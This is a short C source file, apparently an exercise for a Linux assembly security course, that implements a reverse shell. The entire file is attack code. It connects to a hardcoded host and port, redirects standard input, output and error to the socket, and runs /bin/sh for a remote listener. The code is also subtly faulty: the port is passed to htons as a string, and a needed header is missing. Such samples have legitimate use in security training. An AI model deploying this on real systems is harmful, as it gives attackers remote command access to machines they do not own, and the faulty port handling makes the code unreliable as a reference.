/* C reverse shell for SLAE */

#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>

#define rhost "127.0.0.1"
#define rport "4444"

int main(int argc, char *argv[])
{

	int sock = socket(AF_INET, SOCK_STREAM, 0);

	struct sockaddr_in sa;	
	sa.sin_family = AF_INET;
	sa.sin_port = htons(rport);

	inet_pton(AF_INET, rhost, &sa.sin_addr.s_addr);

	connect(sock, (struct sockaddr *)&sa, sizeof(struct sockaddr_in));

	dup2(sock, 0);
	dup2(sock, 1);
	dup2(sock, 2);

	execve("/bin/sh", 0, 0);
}	
